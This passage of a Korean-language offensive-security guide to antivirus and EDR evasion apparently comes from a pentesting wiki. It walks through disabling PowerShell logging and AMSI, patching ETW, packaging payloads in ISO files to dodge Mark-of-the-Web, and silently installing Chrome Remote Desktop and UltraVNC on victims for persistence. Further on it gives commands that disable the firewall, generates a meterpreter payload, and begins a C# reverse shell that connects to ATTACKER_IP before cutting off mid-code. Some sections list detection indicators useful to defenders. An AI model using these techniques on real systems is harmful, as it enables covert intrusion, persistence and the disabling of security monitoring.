- **PowerShell Transcription 및 Module Logging 비활성화**: 이 목적으로 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **PowerShell version 2 사용**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로, AMSI 검사 없이 스크립트를 실행할 수 있습니다. 다음과 같이 실행할 수 있습니다: `powershell.exe -version 2`
- **unmanaged PowerShell session 사용**: [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell)을 사용하면 `powershell.exe`를 실행하지 않고 PowerShell을 호스팅할 수 있습니다(Cobalt Strike의 `powerpick`에서 사용하는 방식). 이 방법은 `powershell.exe` 프로세스에만 연결된 제어를 우회하지만, AMSI, Script Block Logging 또는 다른 모든 PowerShell 방어 기능을 본질적으로 비활성화하지는 않습니다. 적용 범위는 런타임 및 호스트 구현에 따라 다릅니다.


## 난독화

> [!TIP]
> 몇 가지 난독화 기법은 데이터를 암호화하기 때문에 바이너리의 엔트로피가 증가하고 AV와 EDR이 더 쉽게 탐지할 수 있습니다. 주의해서 사용하고, 민감하거나 숨겨야 하는 코드의 특정 부분에만 암호화를 적용하는 것을 고려하세요.

### ConfuserEx-Protected .NET 바이너리 역난독화

ConfuserEx 2(또는 상용 포크)를 사용하는 malware를 분석할 때는 디컴파일러와 sandbox를 차단하는 여러 보호 계층에 직면하는 경우가 많습니다. 아래 워크플로를 사용하면 **원본에 가까운 IL을 안정적으로 복원**한 뒤, dnSpy 또는 ILSpy 같은 도구에서 C#으로 디컴파일할 수 있습니다.<sup>[[10]](#references)</sup>

1.  Anti-tampering 제거 – ConfuserEx는 모든 *method body*를 암호화하고 *module* 정적 생성자(`<Module>.cctor`) 안에서 복호화합니다. 또한 PE checksum을 패치하므로 바이너리를 수정하면 충돌이 발생합니다. **AntiTamperKiller**를 사용하여 암호화된 metadata table을 찾고, XOR 키를 복구한 다음 깨끗한 assembly를 다시 작성하세요:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output에는 자체 unpacker를 만들 때 유용할 수 있는 6개의 anti-tamper 파라미터(`key0-key3`, `nameHash`, `internKey`)가 포함됩니다.

2.  Symbol / control-flow 복구 – *clean* 파일을 **de4dot-cex**(ConfuserEx를 인식하는 de4dot 포크)에 전달합니다.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 프로필을 선택합니다
     • de4dot은 control-flow flattening을 해제하고, 원래 namespace, class 및 변수 이름을 복원하며, 상수 문자열을 복호화합니다.

3.  Proxy-call stripping – ConfuserEx는 decompilation을 더 어렵게 만들기 위해 직접 method 호출을 가벼운 wrapper(a.k.a *proxy calls*)로 대체합니다. **ProxyCall-Remover**를 사용해 제거합니다:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   이 단계를 마치면 불투명한 래퍼 함수(`Class8.smethod_10` 등) 대신 `Convert.FromBase64String`이나 `AES.Create()` 같은 일반적인 .NET API가 표시됩니다.

4.  수동 정리 – 결과 바이너리를 dnSpy에서 실행하고, 큰 Base64 blob이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색해 *실제* payload를 찾습니다. 악성코드는 흔히 이를 `<Module>.byte_0` 내부에서 초기화되는 TLV 인코딩 바이트 배열로 저장합니다.

위 과정을 거치면 악성 샘플을 실행하지 않고도 실행 흐름을 복원할 수 있습니다. 오프라인 워크스테이션에서 작업할 때 유용합니다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 사용자 지정 특성을 생성하며, 이를 IOC로 사용해 샘플을 자동으로 분류할 수 있습니다.

#### 한 줄 명령
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목표는 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)과 tamper-proofing을 통해 소프트웨어 보안을 강화할 수 있는 [LLVM](http://www.llvm.org/) compilation suite의 오픈 소스 fork를 제공하는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 도구를 사용하거나 컴파일러를 수정하지 않고, `C++11/14` 언어를 사용해 컴파일 시 obfuscated code를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework를 통해 생성된 obfuscated operations 계층을 추가하여 애플리케이션을 crack하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등 다양한 PE 파일을 obfuscate할 수 있는 x64 binary obfuscator입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의의 executable을 위한 간단한 metamorphic code engine입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP (return-oriented programming)를 사용하여 LLVM 지원 언어를 위한 세분화된 code obfuscation framework입니다. ROPfuscator는 일반 명령어를 ROP chain으로 변환하여 assembly code 수준에서 프로그램을 obfuscate하고, 정상적인 control flow에 대한 우리의 통념을 무너뜨립니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 로드할 수 있습니다.

### LLVM compiler-assisted per-function self-masking

implant 전체를 잠자는 동안에만 masking하는 대신, 수정된 LLVM X86 backend는 선택된 함수가 비활성 상태일 때마다 XOR-masked 상태로 유지할 수 있습니다. Function Peekaboo PoC는 demangled 이름에 `REG_`가 포함된 함수를 선택하고, 최종 machine code 앞뒤에 position-independent entry/exit stub을 삽입하며, `.text`에 공유 masking handler 하나를 생성합니다. 소스 수준의 signature와 Windows x64 calling convention은 그대로 유지됩니다.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow 변환

이 변환은 **모든 출력된 return**을 처리하고 정확한 x86 레이아웃을 알아야 하므로 instruction selection과 최적화 이후에 수행해야 합니다. pre-emission `MachineFunctionPass`는 마지막 `MachineInstr::isReturn()`을 찾아 삭제해 마지막 경로가 추가된 epilogue로 이어지게 하고, 앞선 return은 `JMP_1 handler`로 바꿉니다. 각 return 앞에 있는 컴파일러 생성 stack/frame teardown은 유지하고, return 명령어만 우회시킵니다.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()`와 `X86AsmPrinter::emitFunctionBodyEnd()`는 함수별 stub을 출력하고, `emitEndOfAsmFile()`은 handler를 출력합니다. 출력 단계 사이에 공유되는 symbol을 사용하면 prologue의 branch가 뒤에 출력되는 epilogue를 대상으로 할 수 있습니다. 수동으로 near `je`를 출력할 때는 `0F 84` 다음에 4바이트 MC expression `target - address_after_je`를 기록합니다. handler로 향하는 call과 jump는 `MCInst` 객체(`CALL64pcrel32` 및 `JMP_1`)로 출력할 수도 있습니다. 아무것도 변경하지 않은 경우 선택되지 않은 함수에 대해 pass는 `false`를 반환해야 하지만, PoC는 이 경로에서 잘못 `true`를 반환합니다.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata 및 pre-CRT 초기화

PoC는 XOR key와 loader-relocated 함수 포인터 및 runtime length를 담은 16바이트 record를 `.funcmeta`에 배치합니다. C 필드는 `uint32_t`지만 handler는 record의 `+8` 오프셋에서 QWORD를 읽어 length와 padding을 함께 가져오고, record를 `0x10`씩 건너뜁니다. PE section 이름은 8바이트만 차지하므로 runtime lookup에서는 `.funcmet`으로 보입니다. 외부 patcher는 executable `.stub`을 추가하고 stub에 이전 entry-point RVA를 저장한 뒤 `AddressOfEntryPoint`를 변경합니다. PIC stub은 `gs:[0x60]` → `[PEB+0x10]`에서 image base를 가져오고, PE32+ imports를 순회해 이미 import된 `VirtualProtect`를 resolve한 다음 CRT보다 먼저 실행됩니다.<sup>[[38]](#references)[[39]](#references)</sup>

초기화 과정에서는 `gs:[0xE8]`에 sentinel을 설정하고 모든 metadata 함수를 호출합니다. 영구적으로 읽을 수 있는 prologue는 함수 시작 위치를 `gs:[0xF0]`에 기록하고 sentinel을 확인한 뒤, 아직 clear 상태인 body를 건너뜁니다. 그러면 epilogue가 `call handler`를 실행합니다. handler가 register 13개(`0x68`바이트)를 저장한 뒤 `[rsp+0x68]`의 return address는 변환된 함수의 끝을 가리키므로, `end - start`를 해당 metadata record에 기록할 수 있습니다. 모든 body를 masking한 뒤 stub은 sentinel을 지우고 `ImageBase + original_entry_point_RVA`로 jump합니다.<sup>[[38]](#references)[[39]](#references)</sup>

정상적인 call 중에는 prologue가 동일한 대칭 handler를 호출해 body를 decode합니다. 마지막 경로는 추가된 epilogue로 이어지고, 그보다 앞선 모든 return은 공유 handler로 바로 jump합니다. 정상적인 epilogue도 `call` 대신 `jmp handler`를 사용하므로, re-masking 후 handler의 `ret`이 원래 호출자의 return address를 사용하고 함수 결과를 `RAX`에 보존합니다.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive 및 분석 지표

handler는 현재 record를 찾고, 고정된 공개 prologue(이 빌드에서는 `0x46`바이트)를 건너뛴 뒤 나머지 영역을 `PAGE_EXECUTE_READWRITE`로 변경하고, 각 바이트에 key의 하위 바이트를 XOR한 다음 `PAGE_EXECUTE_READ`로 설정합니다. 따라서 동일한 loop가 함수 진입 시 decode하고 정상 종료 시마다 encode합니다.<sup>[[38]](#references)[[39]](#references)</sup>

이 설계에서 신뢰도 높은 지표는 다음과 같습니다.<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` 내부의 entry point와 key 및 relocated `.text` pointer를 담은 `.funcmet` section
- pre-CRT PEB, import table, section table parsing 후 각 metadata pointer를 통한 call
- 동일한 `call`/`pop` PIC prologue와 하나의 handler로 redirect되는 다수의 return 지점
- `gs:[0xE8]`, `gs:[0xF0]`, `gs:[0xF8]`에 대한 쓰기, 이어지는 반복적인 `VirtualProtect` 전환 및 image-backed executable page에 대한 bytewise XOR 쓰기

이는 memory-scanner 회피 기법이지 암호화 보호가 아닙니다. patch된 파일에는 여전히 원래의 clear body가 포함되어 있고, debugger에서 `VirtualProtect`나 XOR loop에 breakpoint를 설정하면 활성 함수를 dump할 수 있습니다. single-byte XOR, 읽을 수 있는 metadata, 고정된 `0x46` 경계 때문에 오프라인 복구도 간단합니다.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC의 TEB slot은 thread-local이지만 수정된 code page는 process-wide입니다. 따라서 동시 실행 또는 재귀 호출이 발생하면 다른 invocation이 실행 중인 동안 명령어가 다시 toggle될 수 있으며, 예외와 nonlocal exit으로 인해 re-masking이 생략될 수도 있습니다. 견고하게 구현하려면 전환을 동기화하고, `lpflOldProtect`를 통해 반환된 실제 protection을 복원하며, 하드코딩된 stub 길이를 피하고, x64 stack alignment에 맞게 `call`과 `jmp` 경로를 모두 점검해야 합니다. 또한 executable byte를 다시 쓴 뒤 `FlushInstructionCache`를 호출해야 합니다. Microsoft는 executable code가 수정될 때 instruction-cache coherency를 유지할 책임이 caller에게 있다고 명시합니다.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

인터넷에서 일부 executable을 다운로드해 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성인 애플리케이션의 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 방식으로 작동합니다. 즉, 자주 다운로드되지 않는 애플리케이션은 SmartScreen을 실행해 사용자에게 경고하고 파일 실행을 막습니다(다만 More Info -> Run anyway를 클릭하면 파일을 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 인터넷에서 파일을 다운로드할 때 다운로드한 URL과 함께 자동으로 생성됩니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS 확인.</p></figcaption></figure>

> [!TIP]
> **신뢰할 수 있는** signing certificate로 서명된 executable은 **SmartScreen을 실행하지 않는다는** 점을 알아두는 것이 중요합니다.

payload에 Mark of The Web이 붙지 않도록 하는 매우 효과적인 방법은 payload를 ISO와 같은 컨테이너에 넣는 것입니다. Mark-of-the-Web (MOTW)은 **NTFS가 아닌** 볼륨에는 적용할 수 **없기** 때문입니다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark-of-the-Web을 회피하기 위해 payload를 출력 컨테이너에 패키징하는 도구입니다.

사용 예:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)를 사용해 payload를 ISO 파일 안에 패키징하여 SmartScreen을 우회하는 데모입니다.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows(ETW)는 애플리케이션과 시스템 구성 요소가 **이벤트를 기록**할 수 있도록 하는 Windows의 강력한 로깅 메커니즘입니다. 하지만 보안 제품이 악성 활동을 모니터링하고 탐지하는 데 사용할 수도 있습니다.

AMSI를 비활성화(우회)하는 것과 마찬가지로, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수가 이벤트를 기록하지 않고 즉시 반환하도록 만들 수도 있습니다. 이를 위해 메모리에서 해당 함수를 패치해 즉시 반환하게 하며, 결과적으로 그 프로세스의 ETW 로깅을 비활성화합니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) 및 [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**를 참조하세요.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# 바이너리를 메모리에서 로드하는 방법은 오래전부터 알려져 왔으며, AV에 탐지되지 않고 post-exploitation 도구를 실행하는 아주 좋은 방법으로 여전히 사용됩니다.

payload가 디스크에 기록되지 않고 메모리에 직접 로드되므로, 전체 프로세스에서 AMSI를 패치하는 것만 신경 쓰면 됩니다.

대부분의 C2 프레임워크(sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# 어셈블리를 메모리에서 직접 실행하는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지입니다.

- **Fork\&Run**

**새로운 sacrificial process를 생성**하고, 그 프로세스에 post-exploitation 악성 코드를 주입해 실행한 다음, 실행이 끝나면 새 프로세스를 종료하는 방식입니다. 이 방법에는 장점과 단점이 모두 있습니다. fork and run 방식의 장점은 Beacon implant 프로세스 **외부에서** 실행이 이루어진다는 것입니다. 즉, post-exploitation 작업 중 문제가 발생하거나 탐지되더라도 **implant가 살아남을 가능성이 훨씬 높습니다.** 단점은 **Behavioural Detections**에 탐지될 **가능성이 더 높다**는 것입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation 악성 코드를 **자체 프로세스에** 주입하는 방식입니다. 이렇게 하면 새 프로세스를 생성해 AV 검사를 받는 일을 피할 수 있지만, payload 실행 중 문제가 발생하면 프로세스가 충돌할 수 있으므로 **beacon을 잃을 가능성이 훨씬 높습니다.**

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 관해 더 알아보려면 이 문서 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)와 InlineExecute-Assembly BOF([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 참조하세요.

PowerShell에서도 C# Assemblies를 로드할 수 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t의 영상](https://www.youtube.com/watch?v=oe11Q-3Akuk)을 확인해 보세요.

## .NET 도구의 NativeAOT WebAssembly 재패키징(WasmForge)

일반적인 `execute-assembly` 기법은 식별 가능한 MSIL을 유지하고 결국 CLR을 초기화합니다. **WasmForge**는 대신 실행 기반을 바꿉니다. C# 프로젝트를 실험적인 NativeAOT-LLVM WASI 대상으로 마이그레이션하고, WebAssembly로 미리 컴파일한 다음, 해당 모듈을 Wazero 기반 Windows PE 호스트에 포함합니다. 결과 프로세스는 대상의 CLR, JIT 또는 `dotnet` 호스트를 필요로 하지 않으므로, 관리형 어셈블리 이름, CLR 로딩, AMSI 또는 .NET ETW에만 기반한 규칙은 직접적인 가시성을 잃습니다. 이는 우회/패키징 기법이지 권한 경계를 우회하는 방법은 아닙니다. 게스트는 원래 도구의 권한과 관찰 가능한 OS 동작을 그대로 유지합니다.<sup>[[44]](#references)[[45]](#references)</sup>

### C# 프로젝트 빌드

권장 빌드 방식은 프로젝트의 Docker 환경을 사용하는 것입니다. 이 환경에는 .NET 10 SDK, NativeAOT-LLVM workload, WASI SDK 24.0, linker 및 signing 종속성이 포함되어 있습니다. `.csproj`는 자동으로 감지되며, 한 번의 빌드 과정에서 마이그레이션, 호환성 패치, WASM 컴파일, PE 생성 및 서명이 수행됩니다.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

문제 해결이나 생성된 코드를 검토할 때는 다음 순서로 나누어 진행합니다: `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, 마지막으로 `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. 빌드 이미지에는 WASI Preview 2 component 인코딩을 피하고 내장 runtime이 기대하는 일반 module을 생성하는 `wasm-component-ld` wrapper도 사용됩니다.<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C#과 x64 Win32 연결하기

이것은 투명하게 다시 컴파일하는 방식이 아닙니다. NativeAOT-WASI에서는 Windows 관련 BCL 기능이 없거나 동작이 달라지며, wasm32 guest는 일반적으로 포인터 슬롯에 4바이트를 할당하지만 x64 API는 8바이트 포인터를 반환할 수 있습니다. WasmForge는 다음과 같이 생성되는 계층을 통해 두 문제를 해결합니다.<sup>[[44]](#references)</sup>

1. Source patcher는 AOT 관련 의미 차이를 바로잡고 지원되지 않는 registry, pipes, WMI, identity, directory-service, file-version, LSA 및 유사한 호출을 `Wf*` helper로 리디렉션합니다.
2. P/Invoke scanner는 NativeAOT `DirectPInvoke` 매핑을 생성하여 `[DllImport]` 호출이 guest 내부에서 선언된 DLL을 동적으로 로드하는 대신 링크된 C bridge symbol에 바인딩되도록 합니다.
3. Host-bound 포인터는 C#에서 `ulong`, C에서 `uint64_t`를 사용합니다. Generic dispatcher는 호출을 host의 Win32 handler로 전달하고, `out8_mask`는 상위 절반을 보존해야 하는 실제 8바이트 출력 슬롯을 표시합니다. 표시되지 않은 wasm32 형태의 출력은 snapshot/restore 보호를 사용하여 x64 쓰기가 인접한 4바이트를 손상시키지 않도록 합니다.
4. 전용 host bridge는 LSA ticket-cache 액세스, 구조화된 결과를 사용하는 Kerberos/BCrypt 작업, TCP KDC 트래픽, LDAP 쿼리처럼 generic syscall dispatch에 맞지 않는 작업을 처리합니다.

예를 들어 `version.dll!VerQueryValueW`용 wrapper는 네 개의 host 주소를 전달하고 비트 2와 3(`0xC`)을 설정합니다. 값 포인터와 길이가 8바이트 출력 슬롯이기 때문입니다. Wrapper 자체는 generic 상태를 유지하며 DLL 이름, export 이름, 인수, mask를 `wf_call_v2`에 전달합니다. Host는 포인터를 변환하고 native API를 호출합니다.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### 제한 사항 및 탐지 피벗

Reflection을 많이 사용하는 코드, 동적 assembly 로딩, 임의의 native callback, WASM 메모리로 반환되는 복잡한 x64 구조체는 여전히 도구별 패치가 필요하거나 아예 실패할 수 있습니다. 일반적인 WASI Preview 2 소켓도 no-op stub에 연결될 수 있으므로, 지원되는 도구는 프로토콜별 host shim을 사용합니다. 기능이 동일할 것이라고 가정하지 말고 각 명령을 native 빌드와 비교해 검증하세요.<sup>[[44]](#references)[[45]](#references)</sup>

이 기법은 payload를 보이지 않게 만드는 것이 아니라 telemetry의 방향을 바꿉니다. 탐지는 WASM 모듈을 포함하거나 생성하는 PE, Wazero와 유사한 runtime 동작, 이례적인 host/guest 메모리 할당 및 복사, 일반적인 직접 Win32 호출, 서명 및 PE 리소스 이상, 그리고 그에 따른 API 호출과 네트워크 트래픽을 대상으로 삼을 수 있습니다. 따라서 CLR-load, AMSI, .NET ETW 이벤트가 없다는 사실을 프로세스가 안전하다는 증거로 간주해서는 안 됩니다.<sup>[[44]](#references)</sup>

## 다른 프로그래밍 언어 사용

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한 것처럼, 침해된 시스템이 **Attacker Controlled SMB share에 설치된 interpreter 환경에 접근하도록** 하여 다른 언어로 악성 코드를 실행할 수 있습니다.

SMB share의 Interpreter Binaries와 환경에 접근할 수 있게 하면, 침해된 시스템의 **메모리 내에서 해당 언어로 임의 코드를 실행할 수 있습니다**.

저장소에 따르면 Defender는 여전히 스크립트를 검사하지만, Go, Java, PHP 등을 활용하면 **정적 시그니처를 우회할 유연성이 커집니다**. 이들 언어로 작성한 난독화되지 않은 무작위 reverse shell 스크립트로 테스트한 결과 성공한 것으로 나타났습니다.

## 정적 분석 회피를 위한 WebAssembly 재호스팅

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping은 EDR이나 AV 같은 보안 제품의 access token을 조작합니다. token의 권한을 낮추면 프로세스는 계속 실행되면서도 권한이 필요한 검사나 대응 작업을 수행하지 못할 수 있습니다.

이를 방지하기 위해 Windows는 **외부 프로세스가** 보안 프로세스의 token에 대한 핸들을 얻지 못하도록 할 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 신뢰할 수 있는 소프트웨어 사용

### Chrome Remote Desktop

[**이 블로그 게시물**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에서 설명한 것처럼, 피해자 PC에 Chrome Remote Desktop을 설치한 다음 이를 사용해 장악하고 persistence를 유지하는 방법은 간단합니다:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/에서 다운로드하고 "Set up via SSH"를 클릭한 다음 Windows용 MSI 파일을 클릭해 다운로드합니다.
2. 피해자 시스템에서 설치 프로그램을 조용히 실행합니다(관리자 권한 필요): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가 Next를 클릭합니다. 그러면 마법사에서 인증을 요청하므로 Authorize 버튼을 클릭해 계속합니다.
4. 필요한 부분을 수정해 제공된 명령을 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` 매개변수를 사용하면 GUI 없이 PIN을 설정할 수 있습니다).
 

## 고급 회피

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

회피는 매우 복잡한 주제입니다. 때로는 한 시스템에서 여러 종류의 telemetry를 고려해야 하므로, 성숙한 환경에서 완전히 탐지되지 않는 것은 사실상 불가능합니다.

대상 환경마다 고유한 강점과 약점이 있습니다.

고급 회피 기법을 익히기 위한 발판으로 [@ATTL4S](https://twitter.com/DaniLJ94)의 이 발표를 꼭 시청해 보시기 바랍니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

이 발표도 [@mariuszbit](https://twitter.com/mariuszbit)이 Evasion in Depth에 관해 진행한 훌륭한 발표입니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **이전 기법**

### **Defender가 악성으로 판단하는 부분 확인**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 **바이너리의 일부를 제거해 가며 Defender가 악성으로 판단하는 부분을 찾아 분리할 수 있습니다**.\
**같은 기능을 하는** 다른 도구로는 [**avred**](https://github.com/dobin/avred)가 있으며, [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 웹 서비스로 제공됩니다.

### **Telnet Server**

Windows 10 이전에는 모든 Windows에 **Telnet server**가 포함되어 있었으며, 다음 명령을 관리자 권한으로 실행해 설치할 수 있었습니다:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

시스템이 시작될 때 **시작**되도록 설정하고 지금 **실행**하세요:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**텔넷 포트 변경 (스텔스) 및 방화벽 비활성화:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

여기에서 다운로드하세요: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup이 아니라 bin 다운로드가 필요합니다)

**호스트에서**: _**winvnc.exe**_를 실행하고 서버를 설정하세요.

- _Disable TrayIcon_ 옵션을 활성화합니다.
- _VNC Password_에 비밀번호를 설정합니다.
- _View-Only Password_에 비밀번호를 설정합니다.

그런 다음 바이너리 _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 **피해자** 내부로 옮깁니다.

#### **Reverse connection**

**공격자**는 자신의 **호스트에서** `vncviewer.exe -listen 5900` 바이너리를 **실행**해 reverse **VNC connection**을 수신할 준비를 해야 합니다. 그런 다음 **피해자**에서 winvnc 데몬 `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`을 실행합니다.

**경고:** 은밀성을 유지하려면 다음 작업을 하지 마세요.

- `winvnc`가 이미 실행 중이라면 시작하지 마세요. [팝업](https://i.imgur.com/1SROTTl.png)이 표시됩니다. `tasklist | findstr winvnc`로 실행 중인지 확인하세요.
- 같은 디렉터리에 `UltraVNC.ini`가 없는 상태에서 `winvnc`를 시작하지 마세요. [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다.
- 도움말을 보려고 `winvnc -h`를 실행하지 마세요. [팝업](https://i.imgur.com/oc18wcu.png)이 표시됩니다.

### GreatSCT

여기에서 다운로드하세요: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT 내부:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

이제 `msfconsole -r file.rc`로 **리스너를 시작**하고 다음 명령으로 **XML payload**를 **실행**하세요:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**현재 Defender는 프로세스를 매우 빠르게 종료합니다.**

### 자체 reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음 명령으로 컴파일합니다:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

다음과 함께 사용하세요:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
